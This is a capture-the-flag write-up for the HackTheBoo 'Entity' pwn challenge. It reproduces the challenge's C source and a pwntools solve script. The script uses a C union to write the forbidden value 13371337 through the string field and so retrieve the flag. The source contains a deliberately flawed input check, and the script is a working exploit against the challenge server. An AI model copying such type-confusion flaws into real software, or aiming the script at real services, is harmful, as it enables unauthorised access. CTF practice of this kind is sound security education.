# Entity

## Background

> This Spooky Time of the year, what's better than watching a scary film on the TV? Well, a lot of things, like playing CTFs but you know what's definitely not better? Something coming out of your TV!

> Difficulty: Easy

- Overall difficulty for me: Hard

**In this challenge, we can spawn a docker instance and [download a file](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Pwn/Entity/pwn_entity.zip):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Pwn/Entity/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Pwn/Entity]
└─# unzip pwn_entity.zip        
Archive:  pwn_entity.zip
   creating: pwn_entity/
  inflating: pwn_entity/entity.c     
 extracting: pwn_entity/flag.txt     
  inflating: pwn_entity/entity

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Pwn/Entity]
└─# file pwn_entity/*
pwn_entity/entity:   ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=021fdb309f6c542e5879cc8f8baf4d3490c4964a, for GNU/Linux 3.2.0, not stripped
pwn_entity/entity.c: C source, ASCII text
pwn_entity/flag.txt: ASCII text
```

After unzipped, we have:

- ELF 64-bit LSB pie executable
- C source code of that executable
- fake flag for local testing

## Find the flag

**`checksec`:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Entity/pwn_entity]
└─# checksec entity        
[*] '/root/ctf/HackTheBoo/Pwn/Entity/pwn_entity/entity'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**`ldd`:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Entity/pwn_entity]
└─# ldd entity  
	linux-vdso.so.1 (0x00007ffc05ffd000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff636000000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff6363cf000)
```

**`entity.c`:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static union {
    unsigned long long integer;
    char string[8];
} DataStore;

typedef enum {
    STORE_GET,
    STORE_SET,
    FLAG
} action_t;

typedef enum {
    INTEGER,
    STRING
} field_t;

typedef struct { 
    action_t act;
    field_t field;
} menu_t;

menu_t menu() {
    menu_t res = { 0 };
    char buf[32] = { 0 };
    printf("\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'T':
        res.act = STORE_SET;
        break;
    case 'R':
        res.act = STORE_GET;
        break;
    case 'C':
        res.act = FLAG;
        return res;
    default:
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }

    printf("\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'L':
        res.field = INTEGER;
        break;
    case 'S':
        res.field = STRING;
        break;
    default:
        printf("\nYou are doomed!\n");
        exit(-1);
    }
    return res;
}

void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}

void get_field(field_t f) {
    printf("\nAnything else to try?\n\n>> ");
    switch (f) {
    case INTEGER:
        printf("%llu\n", DataStore.integer);
        break;
    case STRING:
        printf("%.8s\n", DataStore.string);
        break;
    }
}

void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    bzero(&DataStore, sizeof(DataStore));
    printf("\nSomething strange is coming out of the TV..\n");
    while (1) {
        menu_t result = menu();
        switch (result.act) {
        case STORE_SET:
            set_field(result.field);
            break;
        case STORE_GET:
            get_field(result.field);
            break;
        case FLAG:
            get_flag();
            break;
        }
    }

}
```

**Let's break down this C file!**

- When we run that executable, we'll be prompt for 3 options:
	- (T)ry to turn it off
	- (R)un
	- (C)ry, `res.act` = the flag and return that variable
	- If we don't type the above option, exit the programe

- When we chose `(T)ry to turn it off`, `(L)ie down`, and `DataStore.integer == 13371337`:

```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Entity/pwn_entity]
└─# ./entity

Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> L

Maybe try a ritual?

>> 13371337

What's this nonsense?!
```

**It'll print: `What's this nonsense?!`**

**If `DataStore.integer == 13371337`, then cat the flag:**
```c
void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}
```

**Also, if you look at the source code carefully, you'll see:**
`4294967295`
- Choosing option `T`:
	- Option `L`: Assign our input to variable `DataStore.integer` (Datatype = unsigned long long int)
	- Option `S`: Copy our input to variable `DataStore.string` (Datatype = string)
- Choosing option `R`:
	- Option `L`: Print the value of variable `DataStore.integer`
	- Option `S`: Print the value of variable `DataStore.string`, **8 characters only**
- Choosing option `C`:
	- If `DataStore.integer` is `13371337` then concatenate the `flag.txt`
	- If not, exit

**Hmm... Let's try to run the executable:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Entity/pwn_entity]
└─# ./entity

Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>> T

This does not seem to work.. (L)ie down or (S)cream

>> S

Maybe try a ritual?

>> test

(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> S

Anything else to try?

>> test


(T)ry to turn it off
(R)un
(C)ry

>> R

This does not seem to work.. (L)ie down or (S)cream

>> L

Anything else to try?

>> 44903392628

(T)ry to turn it off
(R)un
(C)ry
```

**So, what if I set the `DataStore.integer` is `13371337` via copying a string?**

**After fumbling around and banging my head against the wall, I found something interesting:**
```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
```

In the `DataStore.integer` variable, it's a **union variable, which means it creates a user-defined type.** (Source: [Programiz](https://www.programiz.com/c-programming/c-unions))

**Now, we can abuse this to overwrite the byte of the `DataStore.integer` via storing the `13371337` characters to the union string array.**

**To do so, I'll write python script:**
```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'critical' # No logging
elf = context.binary = ELF('./entity')

debug = False

if debug == True:
    p = process()
else:
    p = remote('161.35.33.243', 30956)

# T -> S -> 13371337 in hex (Little endian) -> R -> L -> C (Get the flag)
p.recvuntil(b'>> ')
p.sendline(b'T')
p.recvuntil(b'>> ')
p.sendline(b'S')
p.recvuntil(b'>> ')

# Send 13371337 in hex (Little endian)
p.sendline(pack(13371337))

p.recvuntil(b'>> ')
p.sendline(b'R')
p.recvuntil(b'>> ')
p.sendline(b'L')
p.recvuntil(b'>> ')
p.sendline(b'C')
p.recvuntil(b'>> ')

flag = p.recv()
print(flag.decode('utf-8'))
```

**Output:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Pwn/Entity/pwn_entity]
└─# python3 solve.py
HTB{f1ght_34ch_3nt1ty_45_4_un10n}
```

We got the flag!

# Conclusion

What we've learned:

1. Exploiting C Unions